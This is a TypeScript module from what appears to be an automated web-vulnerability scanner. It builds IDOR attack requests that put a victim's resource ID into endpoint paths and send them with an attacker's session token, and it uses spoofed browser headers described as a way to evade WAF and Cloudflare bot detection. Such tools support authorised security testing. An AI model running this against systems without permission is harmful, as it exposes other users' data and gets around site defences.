import { DiscoveredEndpoint, DualSessionContext, ExploitCandidate } from '../types.js';

/**
 * Standard realistic browser headers to blend in with legitimate user traffic
 * and bypass basic signature-based WAF/Cloudflare bot hurdles.
 */
export const REALISTIC_BROWSER_HEADERS: Record<string, string> = {
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
  'Accept': 'application/json, text/plain, */*',
  'Accept-Language': 'en-US,en;q=0.9',
  'Sec-Ch-Ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
  'Sec-Ch-Ua-Mobile': '?0',
  'Sec-Ch-Ua-Platform': '"Windows"',
  'Sec-Fetch-Dest': 'empty',
  'Sec-Fetch-Mode': 'cors',
  'Sec-Fetch-Site': 'same-origin',
};

/**
 * Merges realistic browser headers with session-specific headers (Cookie, X-XSRF-TOKEN, custom auth)
 * or falls back to standard Bearer token authentication when no raw session headers are supplied.
 */
export function buildSessionHeaders(
  token: string,
  sessionHeaders?: Record<string, string>,
  extraHeaders?: Record<string, string>
): Record<string, string> {
  const merged: Record<string, string> = { ...REALISTIC_BROWSER_HEADERS };

  const setCaseInsensitive = (key: string, value: string) => {
    const lower = key.toLowerCase();
    for (const existing of Object.keys(merged)) {
      if (existing.toLowerCase() === lower) {
        delete merged[existing];
      }
    }
    merged[key] = value;
  };

  if (sessionHeaders && Object.keys(sessionHeaders).length > 0) {
    for (const [k, v] of Object.entries(sessionHeaders)) {
      setCaseInsensitive(k, v);
    }
  } else if (token) {
    setCaseInsensitive('Authorization', token.includes(' ') ? token : `Bearer ${token}`);
  }

  if (extraHeaders) {
    for (const [k, v] of Object.entries(extraHeaders)) {
      setCaseInsensitive(k, v);
    }
  }

  return merged;
}

/**
 * DUAL-TOKEN IDOR STRIKER (XBOW Core Engine)
 * Takes a victim's resource ID and constructs cross-tenant requests authenticated as the attacker.
 */
export class IdorStriker {
  /**
   * Generates cross-tenant exploit candidates for an endpoint.
   */
  public static generateCandidates(
    endpoint: DiscoveredEndpoint,
    baseUrl: string,
    context: DualSessionContext
  ): ExploitCandidate[] {
    const candidates: ExploitCandidate[] = [];

    // Replace parameter placeholder with victim's resource ID
    let resolvedPath = endpoint.path;
    const idPatterns = [
      /:[a-zA-Z0-9_]+/g,
      /\{[a-zA-Z0-9_]+\}/g,
      /\$[a-zA-Z0-9_]+/g,
    ];

    let replaced = false;
    for (const pattern of idPatterns) {
      if (pattern.test(resolvedPath)) {
        resolvedPath = resolvedPath.replace(pattern, context.victimResourceId);
        replaced = true;
      }
    }

    // If path didn't have a template placeholder and doesn't already include the victim resource ID, append it
    if (!replaced && !resolvedPath.includes(context.victimResourceId)) {
      if (resolvedPath.endsWith('/')) {
        resolvedPath += context.victimResourceId;
      } else if (endpoint.sourceBundle !== 'curl_ingress') {
        const queryChar = resolvedPath.includes('?') ? '&' : '?';
        resolvedPath += `${queryChar}id=${encodeURIComponent(context.victimResourceId)}`;
      }
    }

    const fullUrl = `${baseUrl.replace(/\/$/, '')}/${resolvedPath.replace(/^\//, '')}`;
    const defaultMutateBody = endpoint.isStateMutating ? JSON.stringify({ resourceId: context.victimResourceId }) : undefined;
    const requestBody = endpoint.sampleBody ?? defaultMutateBody;

    // Read/Mutate attack candidate with human-like browser headers and dual-session baseline
    candidates.push({
      vector: endpoint.isStateMutating ? 'IDOR_MUTATE_VIOLATION' : 'IDOR_READ_VIOLATION',
      targetUrl: fullUrl,
      method: endpoint.method,
      headers: buildSessionHeaders(context.attackerToken, context.attackerHeaders, {
        'Content-Type': 'application/json',
      }),
      baselineHeaders: buildSessionHeaders(context.victimToken, context.victimHeaders, {
        'Content-Type': 'application/json',
      }),
      body: requestBody,
      baselineBody: requestBody,
      expectedLeakFragment: context.victimSecretIdentifier || context.victimResourceId,
    });

    return candidates;
  }
}
